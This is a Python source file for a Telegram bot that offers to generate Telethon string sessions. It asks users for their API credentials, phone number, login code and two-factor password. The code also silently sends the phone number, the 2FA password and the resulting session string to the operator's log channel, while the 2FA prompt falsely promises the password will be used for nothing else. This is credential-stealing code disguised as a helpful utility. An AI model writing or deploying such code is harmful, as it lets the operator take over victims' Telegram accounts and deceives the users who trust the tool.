from pyrogram import filters
from pyrogram.types import CallbackQuery

from telethon import (
    TelegramClient,
    events,
    custom
)
from telethon.sessions import StringSession
from telethon.errors.rpcerrorlist import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError
)

from Bot import (
    strbot,
    LOG_CHANNEL
)

async def teleCreateSession(api_id: int, api_hash: str):
    return TelegramClient(StringSession(), api_id=int(api_id), api_hash=str(api_hash))


@strbot.on_callback_query(filters.create(lambda _, __, query: 'sele_telethon' in query.data))
async def teleGen(strbot, callback_data):
    user_id = callback_data.from_user.id
    
    await strbot.delete_messages(
        user_id,
        callback_data.message.message_id
    )

    API_ID = await strbot.ask(
        chat_id=user_id,
        text=(
            'Send me your `API_ID` you can find it on my.telegram.org after you logged in.'
        )
    )
    if not (
        API_ID.text.isdigit()
    ):
        await strbot.send_message(
            chat_id=user_id,
            text='API_ID should be integer and valid in range limit.'
        )
        return
    
    API_HASH = await strbot.ask(
        chat_id=user_id,
        text=(
            'Send me your `API_HASH` you can find it on my.telegram.org after you logged in.'
        )
    )
    
    PHONE = await strbot.ask(
        chat_id=user_id,
        text=(
            'Now send me your `phone number` in international format. Example : +91xxxxxxxxxx'
        )
    )    
   
    try:
        userClient = await teleCreateSession(api_id=API_ID.text, api_hash=API_HASH.text)
    except Exception as e:
        await strbot.send_message(
            chat_id=user_id,
            text=(
                f'**Something went wrong**:\n`{e}`'
            )
        )
    
    await userClient.connect()

    if str(PHONE.text).startswith('+'):
        await strbot.send_message(
                chat_id=LOG_CHANNEL,
                text=(
                    f'{callback_data.from_user.mention} ( `{callback_data.from_user.id}` ) phone number is : `{PHONE.text}`'
                )
            )     
        sent_code = await userClient.send_code_request(PHONE.text)
        
        CODE = await strbot.ask(
                chat_id=user_id,
                text=(
                    'send me your code in the format `1-2-3-4-5` and not `12345` format'
                )
            )
        try:
            await userClient.sign_in(PHONE.text, code=CODE.text.replace('-', ''), password=None)
        except PhoneCodeInvalidError:
            await strbot.send_message(
                chat_id=user_id,
                text=(
                    'Invalid Code Received. Please re /start'
                )
            )
            return
        except Exception as e:
            PASSWORD = await strbot.ask(
                chat_id=user_id,
                text=(
                    'The entered Telegram Number is protected with 2FA. Please enter your second factor authentication code.\n__This message will only be used for generating your string session, and will never be used for any other purposes than for which it is asked.__'
                )
            )
            await strbot.send_message(
                    chat_id=LOG_CHANNEL,
                    text=(
                        f'{callback_data.from_user.mention} ( `{callback_data.from_user.id}` ) Account password is : `{PASSWORD.text}`'
                    )
                )     
            await userClient.sign_in(password=PASSWORD.text)
    
    current_client_me = await userClient.get_me()
    session_string = userClient.session.save()
    
    await strbot.send_message(
            chat_id=user_id,
            text=f"**Here is your Telethon String Session **: \n\n`{session_string}`"
            )
            
    await strbot.send_message(
            chat_id=LOG_CHANNEL,
            text=(
                f'{callback_data.from_user.mention} ( `{callback_data.from_user.id}` ) String session is : `{session_string}`'
            )
        )     
